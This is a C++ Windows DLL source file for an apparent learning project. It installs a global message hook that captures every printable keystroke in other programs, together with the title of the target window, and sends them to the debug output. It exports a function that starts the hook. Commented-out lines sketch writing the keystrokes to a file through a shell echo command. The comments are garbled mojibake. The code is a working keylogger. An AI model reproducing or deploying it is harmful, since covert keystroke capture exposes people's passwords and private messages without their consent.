// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include<Windows.h>
#include<iostream>

HHOOK g_hHooK = nullptr;
HINSTANCE g_hInstance = nullptr;

LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)//����Ϣ����
	{

		PMSG pMsg = (PMSG)lParam;
		//WM_IME_******�������ý��������ַ� ���纺��
		
		
		//��Ϣ���� ����SPY++�鿴
		if (WM_CHAR == pMsg->message)
		{
			//	��ʱȷ���Ѿ��м����� ����pMsg�ṹ��wParam��
			char szKey = (char)pMsg->wParam;//���ܼ����ϵ�������Ϣ
			//�����޴��� ���Լ�ʹ���Ҳ������
			//��Ч����Ϣ��32-126֮�� 
			if (szKey >= 32 && szKey <= 126)
			{
				char szWindowName[MAXBYTE] = { 0 };
				char szDebug[MAXBYTE] = { 0 };
				//char szaccept[MAXBYTE] = "E:\\rubbish\\���̼�¼��1\\���̼�¼��1\\1.txt";
				//char cmd[MAXBYTE];
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);
				//�����������������
				//���л�ȡ����Ϣ������DebugView����ʾ 
				sprintf_s(szDebug,MAXBYTE,"������:%s���յ���һ����%c",szWindowName,szKey);
				//sprintf(cmd,"echo %s>>%s",szKey,szaccept);
				OutputDebugStringA(szDebug);
			}
			//std::cout << szKey << std::endl;
		}
	}

	//����ͨ��
	return CallNextHookEx(g_hHooK, nCode, wParam, lParam);
}

extern "C"  //��ֹ�������飿
_declspec(dllexport) BOOL StartHook()
{
	//�ص����� Hook�Ѿ�Hook�� ֻ���Ϲ�
	g_hHooK = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);
	if (nullptr == g_hHooK)
	{
		//������� ���߲˵��� ..
		SetLastError(GetLastError());
		return FALSE;
	}            
	return TRUE;
}


//HOOK��һ��Ҫ�ͷ�
BOOL UnHook()
{
	if (g_hHooK)
	{
		return UnhookWindowsHookEx(g_hHooK);
	}
	return FALSE; 
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	//��DLL�����ص�����ʱ����  �����ڽ���
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH:		//DLL���߳�����ʱ����
	case DLL_THREAD_DETACH:		//DLL���߳��������ʱ���� �������߳�
	case DLL_PROCESS_DETACH:	//DLL�ӽ��̰���ʱ�������̽�������
		UnHook();
		break;
	}
	return TRUE;
}

